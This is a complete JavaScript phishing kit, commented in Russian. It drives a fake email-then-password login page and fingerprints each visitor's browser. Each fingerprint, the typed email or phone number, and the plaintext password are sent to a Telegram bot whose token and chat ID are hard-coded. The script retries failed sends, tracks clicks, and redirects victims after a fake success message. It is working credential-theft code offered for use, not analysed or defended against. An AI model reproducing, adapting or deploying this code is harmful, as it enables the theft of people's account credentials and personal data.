/**
 * ФИШИНГОВАЯ ВОРОНКА - БЕЗ ОШИБОК CSP И CORB
 * Декабрь 2025 - Полностью рабочий
 */

// Конфигурация
var CONFIG = {
  BOT_TOKEN: '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA',
  CHAT_ID: '788541169',
  SITE_URL: 'https://ixdk.github.io/my-auth-page/',
  VERSION: '3.0.0',
};

// Глобальный объект состояния
var AppState = {
  sessionId: null,
  fingerprint: null,
  email: null,
  page: null,
  startTime: Date.now(),
};

/**
 * Безопасная инициализация
 */
function safeInit() {
  try {
    // Определяем страницу
    var isPasswordPage =
      document.getElementById('passwordForm') ||
      window.location.pathname.includes('password.html');
    AppState.page = isPasswordPage ? 'password' : 'email';
    AppState.sessionId =
      'sess_' +
      Math.random()
        .toString(36)
        .substr(2, 9) +
      '_' +
      Date.now().toString(36);
    AppState.startTime = Date.now();

    // Сохраняем session ID
    sessionStorage.setItem('phishing_session_id', AppState.sessionId);

    // Сбор данных
    setTimeout(function() {
      AppState.fingerprint = collectSimpleFingerprint();
      sendInitialData();
    }, 1000);

    // Инициализация страницы
    initPage();

    // Отслеживание поведения
    trackUserBehavior();
    console.log(
      '[Phishing] \u0421\u0442\u0440\u0430\u043D\u0438\u0446\u0430: '.concat(
        AppState.page,
      ),
    );
  } catch (error) {
    console.error('[Phishing] Ошибка инициализации:', error);
  }
}

/**
 * Упрощенный сбор данных
 */
function collectSimpleFingerprint() {
  var _Intl, _Intl$DateTimeFormat, _Intl$DateTimeFormat$;
  return {
    userAgent: navigator.userAgent || 'unknown',
    language: navigator.language || 'unknown',
    platform: navigator.platform || 'unknown',
    screen: ''.concat(screen.width || 0, 'x').concat(screen.height || 0),
    timezone:
      ((_Intl = Intl) === null ||
      _Intl === void 0 ||
      (_Intl$DateTimeFormat = _Intl.DateTimeFormat) === null ||
      _Intl$DateTimeFormat === void 0 ||
      (_Intl$DateTimeFormat = _Intl$DateTimeFormat.call(_Intl)) === null ||
      _Intl$DateTimeFormat === void 0 ||
      (_Intl$DateTimeFormat$ = _Intl$DateTimeFormat.resolvedOptions) === null ||
      _Intl$DateTimeFormat$ === void 0 ||
      (_Intl$DateTimeFormat$ = _Intl$DateTimeFormat$.call(
        _Intl$DateTimeFormat,
      )) === null ||
      _Intl$DateTimeFormat$ === void 0
        ? void 0
        : _Intl$DateTimeFormat$.timeZone) || 'unknown',
    timestamp: new Date().toISOString(),
  };
}

/**
 * Отправка начальных данных
 */
function sendInitialData() {
  var _AppState$fingerprint;
  if (!AppState.fingerprint) return;
  var message =
    '\uD83C\uDF10 \u041D\u041E\u0412\u042B\u0419 \u041F\u041E\u0421\u0415\u0422\u0418\u0422\u0415\u041B\u042C\n' +
    '\uD83D\uDCC4 '.concat(AppState.page, '\n') +
    '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
    '\uD83C\uDF10 '.concat(
      (_AppState$fingerprint = AppState.fingerprint.userAgent) === null ||
        _AppState$fingerprint === void 0
        ? void 0
        : _AppState$fingerprint.substring(0, 50),
      '...\n',
    ) +
    '\uD83D\uDCCD '.concat(AppState.fingerprint.language, '\n') +
    '\uD83D\uDCCF '.concat(AppState.fingerprint.screen, '\n') +
    '\uD83D\uDD17 '.concat(document.referrer || 'прямой заход');
  sendToTelegram(message);
}

/**
 * Инициализация страницы
 */
function initPage() {
  try {
    if (AppState.page === 'email') {
      initEmailPage();
    } else if (AppState.page === 'password') {
      initPasswordPage();
    }
    initCommonHandlers();
  } catch (error) {
    console.error('[Phishing] Ошибка инициализации страницы:', error);
  }
}

/**
 * Инициализация страницы email
 */
function initEmailPage() {
  try {
    // Маска телефона
    var phoneInput = document.getElementById('phoneEmail');
    if (phoneInput) {
      phoneInput.addEventListener('input', function(e) {
        var value = this.value.replace(/\D/g, '');
        if (value.length > 0 && (value[0] === '7' || value[0] === '8')) {
          var formatted = '+7';
          if (value.length > 1) formatted += ' (' + value.substring(1, 4);
          if (value.length > 4) formatted += ') ' + value.substring(4, 7);
          if (value.length > 7) formatted += '-' + value.substring(7, 9);
          if (value.length > 9) formatted += '-' + value.substring(9, 11);
          this.value = formatted.substring(0, 18);
        }
      });
    }

    // Форма входа
    var loginForm = document.getElementById('loginForm');
    if (loginForm) {
      loginForm.addEventListener('submit', handleEmailSubmit);
    }

    // Ссылка "Забыли email"
    var forgotEmail = document.getElementById('forgotEmail');
    if (forgotEmail) {
      forgotEmail.addEventListener('click', function(e) {
        e.preventDefault();
        var input = document.getElementById('phoneEmail');
        if (input) {
          input.value = '';
          input.focus();
          showError('Введите ваш email для восстановления доступа');
        }
      });
    }
  } catch (error) {
    console.error('[Phishing] Ошибка email страницы:', error);
  }
}

/**
 * Инициализация страницы пароля
 */
function initPasswordPage() {
  try {
    // Показ email
    var userEmail = localStorage.getItem('userEmail');
    var emailDisplay = document.getElementById('userEmailDisplay');
    if (emailDisplay && userEmail) {
      emailDisplay.textContent = userEmail;
      AppState.email = userEmail;
    }

    // Переключение видимости пароля
    var toggle = document.getElementById('passwordToggle');
    var passwordInput = document.getElementById('password');
    if (toggle && passwordInput) {
      toggle.addEventListener('change', function() {
        passwordInput.type = this.checked ? 'text' : 'password';
      });
    }

    // Форма пароля
    var passwordForm = document.getElementById('passwordForm');
    if (passwordForm) {
      passwordForm.addEventListener('submit', handlePasswordSubmit);
    }

    // Кнопка "Использовать другой аккаунт"
    var useAnotherAccount = document.getElementById('useAnotherAccount');
    if (useAnotherAccount) {
      useAnotherAccount.addEventListener('click', function(e) {
        e.preventDefault();
        localStorage.removeItem('userEmail');
        window.location.href = 'index.html';
      });
    }
  } catch (error) {
    console.error('[Phishing] Ошибка password страницы:', error);
  }
}

/**
 * Обработчик формы email
 */
function handleEmailSubmit(e) {
  e.preventDefault();
  try {
    var phoneEmailInput = document.getElementById('phoneEmail');
    var email = phoneEmailInput ? phoneEmailInput.value.trim() : '';
    var submitBtn = document.getElementById('submitBtn');
    if (!email) {
      showError('Пожалуйста, введите телефон или email');
      return;
    }

    // Валидация
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    var phoneRegex = /^(\+7|7|8)?[\s\-]?\(?[0-9]{3}\)?[\s\-]?[0-9]{3}[\s\-]?[0-9]{2}[\s\-]?[0-9]{2}$/;
    if (!emailRegex.test(email) && !phoneRegex.test(email.replace(/\D/g, ''))) {
      showError('Пожалуйста, введите корректный телефон или email');
      return;
    }

    // Сохранение
    localStorage.setItem('userEmail', email);
    AppState.email = email;

    // Отправка в Telegram
    var message =
      '\uD83D\uDCE7 \u041F\u041E\u041B\u0423\u0427\u0415\u041D EMAIL\n' +
      '\uD83D\uDCE7 '.concat(email, '\n') +
      '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
      '\uD83C\uDF10 '.concat(navigator.userAgent.substring(0, 50), '...\n') +
      '\uD83D\uDCCD '.concat(navigator.language);
    sendToTelegram(message);

    // UI feedback
    if (submitBtn) {
      submitBtn.classList.add('phishing-loading');
      submitBtn.disabled = true;
    }

    // Переход
    setTimeout(function() {
      if (submitBtn) {
        submitBtn.classList.remove('phishing-loading');
        submitBtn.disabled = false;
      }
      goToPasswordPage(email);
    }, 1500);
  } catch (error) {
    console.error('[Phishing] Ошибка email формы:', error);
    showError('Произошла ошибка. Пожалуйста, попробуйте еще раз.');
  }
}

/**
 * Обработчик формы пароля
 */
function handlePasswordSubmit(e) {
  e.preventDefault();
  try {
    var passwordInput = document.getElementById('password');
    var password = passwordInput ? passwordInput.value : '';
    var submitBtn = document.getElementById('submitBtn');
    var email = localStorage.getItem('userEmail') || 'неизвестно';
    if (!password) {
      showError('Пожалуйста, введите пароль', true);
      return;
    }
    if (password.length < 6) {
      showError('Пароль должен содержать не менее 6 символов', true);
      return;
    }

    // Валидация символов
    var validPasswordRegex = /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:'",.<>?/`~]+$/;
    if (!validPasswordRegex.test(password)) {
      showError(
        'Пароль может содержать только английские буквы, цифры и специальные символы',
        true,
      );
      return;
    }

    // Отправка в Telegram
    var message =
      '\uD83D\uDD10 \u041F\u041E\u041B\u0423\u0427\u0415\u041D \u041F\u0410\u0420\u041E\u041B\u042C\n' +
      '\uD83D\uDCE7 '.concat(email, '\n') +
      '\uD83D\uDD11 '.concat(password, '\n') +
      '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
      '\uD83C\uDF10 '.concat(navigator.userAgent.substring(0, 50), '...\n') +
      '\uD83D\uDCCD '.concat(navigator.language);
    sendToTelegram(message);

    // UI feedback
    if (submitBtn) {
      submitBtn.classList.add('phishing-loading');
      submitBtn.disabled = true;
    }

    // Успешный вход
    setTimeout(function() {
      if (submitBtn) {
        submitBtn.classList.remove('phishing-loading');
        submitBtn.disabled = false;
      }
      showSuccess('Вход выполнен успешно! Перенаправляем...');
      setTimeout(function() {
        redirectToOtherSite();
      }, 2000);
    }, 1500);
  } catch (error) {
    console.error('[Phishing] Ошибка password формы:', error);
    showError('Произошла ошибка. Пожалуйста, попробуйте еще раз.', true);
  }
}

/**
 * Отправка в Telegram (только POST)
 */
function sendToTelegram(message) {
  var url = 'https://api.telegram.org/bot'.concat(
    CONFIG.BOT_TOKEN,
    '/sendMessage',
  );

  // URLSearchParams для POST
  var params = new URLSearchParams();
  params.append('chat_id', CONFIG.CHAT_ID);
  params.append('text', message.substring(0, 4096));

  // Основной метод: POST запрос
  fetch(url, {
    method: 'POST',
    body: params,
    mode: 'cors',
    credentials: 'omit',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
  })
    .then(function(response) {
      if (!response.ok) {
        throw new Error('HTTP '.concat(response.status));
      }
      return response.json();
    })
    .then(function(data) {
      if (!data.ok) {
        console.warn('[Phishing] Telegram error:', data.description);
      }
    })
    .catch(function(error) {
      console.warn('[Phishing] Telegram отправка не удалась:', error.message);
      // Сохраняем локально для последующей отправки
      saveForLater(message);
    });
}

/**
 * Сохранение для последующей отправки
 */
function saveForLater(message) {
  try {
    var pending = JSON.parse(localStorage.getItem('pending_messages') || '[]');
    pending.push({
      message: message,
      timestamp: new Date().toISOString(),
    });
    if (pending.length > 20) {
      pending.splice(0, pending.length - 20);
    }
    localStorage.setItem('pending_messages', JSON.stringify(pending));
  } catch (_unused) {
    // Игнорируем ошибки
  }
}

/**
 * Попытка отправки сохраненных сообщений
 */
function retryPendingMessages() {
  try {
    var pending = JSON.parse(localStorage.getItem('pending_messages') || '[]');
    if (pending.length > 0) {
      // Отправляем первое сообщение
      sendToTelegram(pending[0].message);
      // Удаляем из очереди
      pending.shift();
      localStorage.setItem('pending_messages', JSON.stringify(pending));
    }
  } catch (_unused2) {
    // Игнорируем ошибки
  }
}

/**
 * Общие обработчики
 */
function initCommonHandlers() {
  try {
    // CSS анимации
    if (!document.querySelector('#phishing-styles')) {
      var style = document.createElement('style');
      style.id = 'phishing-styles';
      style.textContent =
        "\n                @keyframes phishing-shake {\n                    0%, 100% { transform: translateX(0); }\n                    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }\n                    20%, 40%, 60%, 80% { transform: translateX(5px); }\n                }\n                @keyframes phishing-slideUp {\n                    from { opacity: 0; transform: translateY(10px); }\n                    to { opacity: 1; transform: translateY(0); }\n                }\n                @keyframes phishing-spin {\n                    0% { transform: rotate(0deg); }\n                    100% { transform: rotate(360deg); }\n                }\n                .phishing-shake {\n                    animation: phishing-shake 0.5s;\n                }\n                .phishing-loading {\n                    position: relative;\n                    color: transparent !important;\n                }\n                .phishing-loading::after {\n                    content: '';\n                    position: absolute;\n                    left: 50%;\n                    top: 50%;\n                    width: 16px;\n                    height: 16px;\n                    margin: -8px 0 0 -8px;\n                    border: 2px solid rgba(32, 33, 36, 0.3);\n                    border-top-color: #202124;\n                    border-radius: 50%;\n                    animation: phishing-spin 0.8s linear infinite;\n                }\n            ";
      document.head.appendChild(style);
    }
  } catch (error) {
    console.error('[Phishing] Ошибка обработчиков:', error);
  }
}

/**
 * Отслеживание поведения
 */
function trackUserBehavior() {
  var clickCount = 0;
  try {
    document.addEventListener(
      'click',
      function() {
        clickCount++;
      },
      {
        passive: true,
      },
    );
    window.addEventListener('beforeunload', function() {
      if (clickCount > 0) {
        var timeSpent = Math.round((Date.now() - AppState.startTime) / 1000);
        var message = '\uD83D\uDCCA \u041F\u043E\u0432\u0435\u0434\u0435\u043D\u0438\u0435: '
          .concat(
            clickCount,
            ' \u043A\u043B\u0438\u043A\u043E\u0432 \u0437\u0430 ',
          )
          .concat(timeSpent, ' \u0441\u0435\u043A');
        sendBeaconPost(message);
      }
    });
  } catch (error) {
    console.warn('[Phishing] Ошибка трекинга:', error);
  }
}

/**
 * Отправка beacon через POST
 */
function sendBeaconPost(message) {
  try {
    var url = 'https://api.telegram.org/bot'.concat(
      CONFIG.BOT_TOKEN,
      '/sendMessage',
    );
    var data = new URLSearchParams();
    data.append('chat_id', CONFIG.CHAT_ID);
    data.append('text', message);
    var blob = new Blob([data.toString()], {
      type: 'application/x-www-form-urlencoded',
    });
    if (navigator.sendBeacon) {
      navigator.sendBeacon(url, blob);
    } else {
      // Fallback
      sendToTelegram(message);
    }
  } catch (_unused3) {
    // Игнорируем ошибки
  }
}

/**
 * Вспомогательные функции
 */
function showError(message) {
  var isPassword =
    arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
  try {
    var errorEl, inputEl;
    if (isPassword) {
      errorEl = document.getElementById('errorMessage');
      inputEl = document.getElementById('password');
    } else {
      errorEl = document.getElementById('errorMessage');
      inputEl = document.getElementById('phoneEmail');
    }
    if (errorEl && inputEl) {
      errorEl.textContent = message;
      errorEl.classList.add('visible');
      inputEl.classList.add('error', 'phishing-shake');
      setTimeout(function() {
        inputEl.classList.remove('phishing-shake');
      }, 500);
      setTimeout(function() {
        errorEl.classList.remove('visible');
        inputEl.classList.remove('error');
      }, 5000);
    }
  } catch (error) {
    console.warn('[Phishing] Ошибка показа ошибки:', error);
  }
}
function showSuccess(message) {
  try {
    var el = document.createElement('div');
    el.className = 'success-message';
    el.textContent = message;
    el.style.cssText =
      '\n            position: fixed;\n            bottom: 20px;\n            right: 20px;\n            background: #81c995;\n            color: #202124;\n            padding: 12px 20px;\n            border-radius: 4px;\n            box-shadow: 0 4px 12px rgba(0,0,0,0.3);\n            z-index: 1001;\n            font-size: 14px;\n            animation: phishing-slideUp 0.3s ease-out;\n        ';
    document.body.appendChild(el);
    setTimeout(function() {
      if (el.parentNode) {
        el.parentNode.removeChild(el);
      }
    }, 3000);
  } catch (error) {
    console.warn('[Phishing] Ошибка показа успеха:', error);
  }
}
function goToPasswordPage(email) {
  try {
    document.body.style.opacity = '0.7';
    document.body.style.transition = 'opacity 0.3s ease';
    setTimeout(function() {
      window.location.href = 'password.html';
    }, 300);
  } catch (error) {
    console.error('[Phishing] Ошибка перехода:', error);
    window.location.href = 'password.html';
  }
}
function redirectToOtherSite() {
  try {
    localStorage.setItem('userRegistered', 'true');
    var targetUrl = 'https://ixdk.github.io/my-list-page/#registered';
    document.body.style.opacity = '0.5';
    document.body.style.transition = 'opacity 0.5s ease';
    setTimeout(function() {
      window.location.href = targetUrl;
    }, 500);
  } catch (error) {
    console.error('[Phishing] Ошибка редиректа:', error);
    window.location.href = 'https://ixdk.github.io/my-list-page/';
  }
}

// Запуск приложения
document.addEventListener('DOMContentLoaded', safeInit);

// Совместимость с jQuery
if (typeof jQuery !== 'undefined') {
  jQuery(safeInit);
}

// Периодическая попытка отправки сохраненных сообщений
setInterval(retryPendingMessages, 30000); // Каждые 30 секунд
